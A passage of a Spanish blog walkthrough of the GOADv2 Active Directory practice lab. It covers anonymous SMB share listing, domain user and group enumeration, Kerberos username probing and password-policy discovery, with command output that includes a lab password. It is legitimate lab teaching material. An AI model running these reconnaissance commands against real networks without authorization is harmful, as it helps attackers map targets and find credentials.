---
layout: single
title: Solución a Vulnerabilidades de GOADv2 (Game Of Active Directory v2)
comments: true
excerpt: "Solución a Vulnerabilidades de GOADv2 (Game Of Active Directory v2)"
date: 2023-08-18
classes: wide
header:
  teaser: /assets/images/2023-08-18-Solucion_GOADv2/logo.png
  teaser_home_page: true
categories:
  - Active_Directory
tags:
  - Active Directory
  - Hacking
  - Entornos Empresariales
  - Medium
---



En este articulo, vamos a explorar las vulnerabilidades de [Game Of Active Directory v2](https://mayfly277.github.io/posts/GOADv2/){:target="_blank"} Veremos cómo atacar y resolver los desafíos en castellano.

Un agradecimiento a [M4yFly](https://twitter.com/M4yFly){:target="_blank"} por crear este hermoso laboratorio

### [Mapa Mental](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg){:target="_blank"}

1. [Recursos Compartidos](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#recursos-compartidos)
2. [Enumeración de usuarios](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#enumeraci%C3%B3n-de-usuarios)
3. [Políticas y datos con enum4linux](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#pol%C3%ADticas-y-datos-con-enum4linux)
4. [Buscar contraseñas con Usuarios Enumerados](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#buscar-contrase%C3%B1as-con-usuarios-enumerados)
    1. [ASREPRoast](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#asreproast)
    2. [Password Spray](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#password-spray)
5. [Enumeración Con Usuarios](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#enumeraci%C3%B3n-con-usuarios)
    1. [Volcado con ldapdomaindump](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#volcado-con-ldapdomaindump)
    2. [Kerberoasting](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#kerberoasting)
6. [BloodHound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)
7. [Poison and Relay](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#poison-and-relay)
8. [Explotación con Usuarios](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#explotaci%C3%B3n-con-usuarios)
    1. [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac)
    2. [PrintNightmare Windows Server 2016](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#printnightmare-windows-server-2016)
    3. [PrintNightmare Windows Server 2019](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#printnightmare-windows-server-2019)
9. [ADCS - Active Directory Certificate Services](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs-active-directory-certificate-services)
    1. [ESC8 - coerce to domain admin](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---coerce-to-domain-admin)
    2. [ESC8 - con certipy](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---con-certipy)
    3. [ADCS enumeración con certipy y bloodhound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs-enumeraci%C3%B3n-con-certipy-y-bloodhound)
    4. [ADCS - ESC1](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc1)
    5. [ADCS - ESC2 & ESC3](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc2--esc3)
    6. [ADCS - ESC4](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc4)
    7. [ADCS - ESC6](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc6)
    
---

# Recursos Compartidos

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled.png)

Se puede hacer una revisión de los recursos compartidos con algunas herramientas como enum4linux con el comando  `enum4linux -a -u "" -p "" 192.168.56.23`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #enum4linux -a -u"" -p"" 192.168.56.23
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul  5 18:47:53 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.23
RID Range ........ 500-550,1000-1050
Username ......... '-p'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.23    |
 ===================================================== 
[+] Got domain/workgroup name: ESSOS

 ============================================= 
|    Nbtstat Information for 192.168.56.23    |
 ============================================= 
Looking up status of 192.168.56.23
	ESSOS           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	BRAAVOS         <00> -         B <ACTIVE>  Workstation Service
	BRAAVOS         <20> -         B <ACTIVE>  File Server Service

	MAC Address = 08-00-27-88-10-C9

 ====================================== 
|    Session Check on 192.168.56.23    |
 ====================================== 
[+] Server 192.168.56.23 allows sessions using username '-p', password ''

 ============================================ 
|    Getting domain SID for 192.168.56.23    |
 ============================================ 
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] CB 53 47 64 C5 3E 7E 66   71 D4 5A 84 A4 82 0E 2B   .SGd.>~f q.Z....+
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 192.168.56.23    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.23 from smbclient: 
[+] Got OS info for 192.168.56.23 from srvinfo:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 0F DF 32 22 4E 7B 12 6F   DF 74 EB A8 FA C5 C0 6E   ..2"N{.o .t.....n
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 192.168.56.23    |
 ============================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================== 
|    Share Enumeration on 192.168.56.23    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	all             Disk      Basic RW share for all
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	IPC$            IPC       Remote IPC
	public          Disk      Basic Read share for all domain users
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.23
//192.168.56.23/ADMIN$	Mapping: DENIED, Listing: N/A
//192.168.56.23/all	Mapping: OK, Listing: OK
//192.168.56.23/C$	Mapping: DENIED, Listing: N/A
//192.168.56.23/CertEnroll	Mapping: OK	Listing: DENIED
//192.168.56.23/IPC$	[E] Can't understand response:
NT_STATUS_NO_SUCH_FILE listing \*
//192.168.56.23/public	Mapping: OK	Listing: DENIED

 ===================================================== 
|    Password Policy Information for 192.168.56.23    |
 ===================================================== 
[E] Unexpected error from polenum:
usage: polenum [-h] [--username USERNAME] [--password PASSWORD]
               [--domain DOMAIN] [--protocols [PROTOCOLS ...]]
               [enum4linux]
polenum: error: argument --domain/-d is required
[E] Failed to get password policy with rpcclient

 =============================== 
|    Groups on 192.168.56.23    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 192.168.56.23 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================== 
|    Getting printer info for 192.168.56.23    |
 ============================================== 
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] E3 EA 1D 61 59 74 0A 37   1C BD AC 82 05 58 70 42   ...aYt.7 .....XpB
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Wed Jul  5 18:48:08 2023
```

También con la herramienta smbmap, al pasar el comando solo con el host, puede que de un error `smbmap -H 192.168.56.23`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbmap -H 192.168.56.23
[!] Authentication error on 192.168.56.23
```

Pero con un usuario invitado o con un usuario nulo, puede que el resultado sea diferente `smbmap -H 192.168.56.23 -u 'guest'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbmap -H 192.168.56.23 -u 'guest'
[+] IP: 192.168.56.23:445	Name: braavos.essos.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	all                                               	READ, WRITE	Basic RW share for all
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	IPC$                                              	READ ONLY	Remote IPC
	public                                            	NO ACCESS	Basic Read share for all domain users
```

Otra Herramienta que nos puede servir es smbclient, con el comando `smbclient -N -L 192.168.56.23`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #smbclient -N -L 192.168.56.23

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	all             Disk      Basic RW share for all
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	IPC$            IPC       Remote IPC
	public          Disk      Basic Read share for all domain users
SMB1 disabled -- no workgroup available
```

y por último en estos ejemplo de herramientas podemos usar crackmapexec  con el comando `cme smb 192.168.56.10-23 -u '' -p '' --shares`  puede ser que nos de un error, para este ejemplo yo ejecuto el comando `cme` ya que tengo el binario de crackmapexec 6.0.0 que se puede descargar desde este [Link](https://github.com/mpgn/CrackMapExec/releases/tag/v6.0.0){:target="_blank"}

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.10-23 -u '' -p '' --shares
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.22   445    CASTELBLACK      [-] Error enumerating shares: Error occurs while reading from remote(104)
SMB         192.168.56.23   445    BRAAVOS          [-] essos.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.23   445    BRAAVOS          [-] Error enumerating shares: Error occurs while reading from remote(104)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

Al igual que con smbmap, puede ser que con un usuario nulo o invitado obtengamos resultados diferentes. Estos comandos nos dan los mismos resultados. Existen muchas más herramientas que se pueden utilizar, pero para este caso solo vamos a utilizar éstas.

`cme smb 192.168.56.10-23 -u 'null' -p '' --shares`

`cme smb 192.168.56.10-23 -u 'guest' -p '' --shares`

`cme smb 192.168.56.10-23 -u 'a' -p '' --shares`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.10-23 -u 'null' -p '' --shares
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\null: 
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\null: STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [-] Connection Error: The NETBIOS connection with the remote host timed out.
```

---

# Enumeración de Usuarios

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%201.png)

Para la enumeración de usuarios, también podemos hacerlo con varias herramientas, como por ejemplo Crackmapexec, utilizando el siguiente comando: `cme smb 192.168.56.11 --users`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.11 --users
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating domain users using dc ip 192.168.56.11: NTLM needs domain\username and a password
SMB         192.168.56.11   445    WINTERFELL       [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
```

Enumerar usuarios con rpcclient cuando el servicio permite acceso anónimo.`rpcclient -U "NORTH\\" 192.168.56.11 -N`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #rpcclient -U "NORTH\\" 192.168.56.11 -N
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

rpcclient $> enumdomgroups
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]
rpcclient $>
```

También, si se tiene acceso anónimo, se pueden enumerar usuarios con net rpc mediante el comando.`net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
NORTH\Administrator
NORTH\vagrant
NORTH\krbtgt
NORTH\SEVENKINGDOMS$
NORTH\arya.stark
NORTH\eddard.stark
NORTH\catelyn.stark
NORTH\robb.stark
NORTH\sansa.stark
NORTH\brandon.stark
NORTH\rickon.stark
NORTH\hodor
NORTH\jon.snow
NORTH\samwell.tarly
NORTH\jeor.mormont
NORTH\sql_svc
```

Podemos obtener una lista de posibles usuarios desde la [página](https://www.hbo.com/game-of-thrones/cast-and-crew){:target="_blank"} con el siguente comando `curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' | sort -u > User_nort.txt`

```csharp
┌──(angussmoody㉿DESKTOP-97EIK9O)-[/mnt/c/Users/angussmoody]
└─$ curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' | sort -u > User_nort.txt
```

Leemos el archivo exportado con el comando `cat User_nort.txt`

```csharp
┌──(angussmoody㉿DESKTOP-97EIK9O)-[/mnt/c/Users/angussmoody]
└─$ cat User_nort.txt
alliser.thorne
archmaester.ebrose
arya.stark
balon.greyjoy
barristan.selmy
benjen.stark
beric.dondarrion
bran.stark
brienne.of
bronn
brother.ray
brynden.tully
catelyn.stark
cersei.lannister
daario.naharis
daenerys.targaryen
davos.seaworth
doran.martell
euron.greyjoy
gendry
gilly
grand.maester
grey.worm
high.priestess
high.sparrow
hodor
izembaro
jaime.lannister
jaqen.h’ghar
jeor.mormont
joffrey.baratheon
jon.snow
jorah.mormont
khal.drogo
lady.crane
lancel.lannister
loras.tyrell
lysa.arryn
maester.aemon
maester.luwin
mance.rayder
margaery.tyrell
melisandre
missandei
myrcella.baratheon
nym.sand
obara.sand
oberyn.martell
olenna.tyrell
orell
osha
podrick.payne
qyburn
ramsay.snow
randyll.tarly
renly.baratheon
rickon.stark
robb.stark
robert.baratheon
robin.arryn
roose.bolton
ros
samwell.tarly
sansa.stark
shae
stannis.baratheon
talisa.stark
theon.greyjoy
thoros.of
tommen.baratheon
tormund
trystane.martell
tyene.sand
tyrion.lannister
tywin.lannister
varys
viserys.targaryen
yara.greyjoy
ygritte
```

También podemos sacar un listado desde Nmap con los comandos.

`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=User_nort.txt" 192.168.56.10`

`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=User_nort.txt" 192.168.56.12`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=User_nort.txt" 192.168.56.10
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 20:57 -05
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for sevenkingdoms.local (192.168.56.10)
Host is up (0.0018s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     joffrey.baratheon@sevenkingdoms.local
|     robert.baratheon@sevenkingdoms.local
|     stannis.baratheon@sevenkingdoms.local
|     jaime.lannister@sevenkingdoms.local
|     tywin.lannister@sevenkingdoms.local
|     renly.baratheon@sevenkingdoms.local
|_    cersei.lannister@sevenkingdoms.local
MAC Address: 08:00:27:9A:71:68 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=User_nort.txt" 192.168.56.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 20:59 -05
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for essos.local (192.168.56.12)
Host is up (0.0016s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     daenerys.targaryen@essos.local
|     khal.drogo@essos.local
|     viserys.targaryen@essos.local
|_    jorah.mormont@essos.local
MAC Address: 08:00:27:90:F5:B0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
```

---

# Políticas y datos con enum4linux

Esto lo podemos realizar con la herramienta crackmapexec, utilizando el comando `cme smb 192.168.56.11 --pass-pol`.

La política de contraseñas indica que si fallamos 5 veces, las cuentas se bloquearán durante 5 minutos.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.11 --pass-pol
SMB         192.168.56.11   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    NONE             [+] Dumping password info for domain: NORTH
SMB         192.168.56.11   445    NONE             Minimum password length: 5
SMB         192.168.56.11   445    NONE             Password history length: 24
SMB         192.168.56.11   445    NONE             Maximum password age: 311 days 2 minutes 
SMB         192.168.56.11   445    NONE             
SMB         192.168.56.11   445    NONE             Password Complexity Flags: 000000
SMB         192.168.56.11   445    NONE             	Domain Refuse Password Change: 0
SMB         192.168.56.11   445    NONE             	Domain Password Store Cleartext: 0
SMB         192.168.56.11   445    NONE             	Domain Password Lockout Admins: 0
SMB         192.168.56.11   445    NONE             	Domain Password No Clear Change: 0
SMB         192.168.56.11   445    NONE             	Domain Password No Anon Change: 0
SMB         192.168.56.11   445    NONE             	Domain Password Complex: 0
SMB         192.168.56.11   445    NONE             
SMB         192.168.56.11   445    NONE             Minimum password age: 1 day 4 minutes 
SMB         192.168.56.11   445    NONE             Reset Account Lockout Counter: 5 minutes 
SMB         192.168.56.11   445    NONE             Locked Account Duration: 5 minutes 
SMB         192.168.56.11   445    NONE             Account Lockout Threshold: 5
SMB         192.168.56.11   445    NONE             Forced Log off Time: Not Set
```

ver información con enum4linux como accesos anónimos, enumeración de usuarios, de grupos, políticas de contraseñas, entre otros.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #enum4linux 192.168.56.11
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul  4 20:37:45 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.11
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.11    |
 ===================================================== 
[+] Got domain/workgroup name: NORTH

 ============================================= 
|    Nbtstat Information for 192.168.56.11    |
 ============================================= 
Looking up status of 192.168.56.11
	WINTERFELL      <00> -         B <ACTIVE>  Workstation Service
	NORTH           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	NORTH           <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	WINTERFELL      <20> -         B <ACTIVE>  File Server Service
	NORTH           <1b> -         B <ACTIVE>  Domain Master Browser

	MAC Address = 08-00-27-A1-0A-76

 ====================================== 
|    Session Check on 192.168.56.11    |
 ====================================== 
[+] Server 192.168.56.11 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.168.56.11    |
 ============================================ 
Domain Name: NORTH
Domain Sid: S-1-5-21-1107438274-2790715175-3618822122
[+] Host is part of a domain (not a workgroup)

 ======================================= 
|    OS information on 192.168.56.11    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.11 from smbclient: 
[+] Got OS info for 192.168.56.11 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 192.168.56.11    |
 ============================== 
index: 0x18ac RID: 0x456 acb: 0x00000210 Account: arya.stark	Name: (null)	Desc: Arya Stark
index: 0x18bf RID: 0x45b acb: 0x00010210 Account: brandon.stark	Name: (null)	Desc: Brandon Stark
index: 0x16f5 RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x18c3 RID: 0x45d acb: 0x00000210 Account: hodor	Name: (null)	Desc: Brainless Giant
index: 0x18c7 RID: 0x460 acb: 0x00000210 Account: jeor.mormont	Name: (null)	Desc: Jeor Mormont
index: 0x18c4 RID: 0x45e acb: 0x00040210 Account: jon.snow	Name: (null)	Desc: Jon Snow
index: 0x18c0 RID: 0x45c acb: 0x00000210 Account: rickon.stark	Name: (null)	Desc: Rickon Stark
index: 0x18c6 RID: 0x45f acb: 0x00000210 Account: samwell.tarly	Name: (null)	Desc: Samwell Tarly (Password : Heartsbane)
index: 0x18bc RID: 0x45a acb: 0x00000210 Account: sansa.stark	Name: (null)	Desc: Sansa Stark
index: 0x18c8 RID: 0x461 acb: 0x00000210 Account: sql_svc	Name: (null)	Desc: sql service

user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

 ========================================== 
|    Share Enumeration on 192.168.56.11    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.56.11

 ===================================================== 
|    Password Policy Information for 192.168.56.11    |
 ===================================================== 

[+] Attaching to 192.168.56.11 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:192.168.56.11)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] NORTH
	[+] Builtin

[+] Password Info for Domain: NORTH

	[+] Minimum password length: 5
	[+] Password history length: 24
	[+] Maximum password age: 311 days 2 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 5 minutes 
	[+] Locked Account Duration: 5 minutes 
	[+] Account Lockout Threshold: 5
	[+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =============================== 
|    Groups on 192.168.56.11    |
 =============================== 

[+] Getting builtin groups:
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]

[+] Getting builtin group memberships:
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[AcrossTheSea] rid:[0x455]

[+] Getting local group memberships:
Group 'AcrossTheSea' (RID: 1109) has member: Couldn't lookup SIDs
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]

[+] Getting domain group memberships:
Group 'Domain Guests' (RID: 514) has member: NORTH\Guest
Group 'Stark' (RID: 1106) has member: NORTH\arya.stark
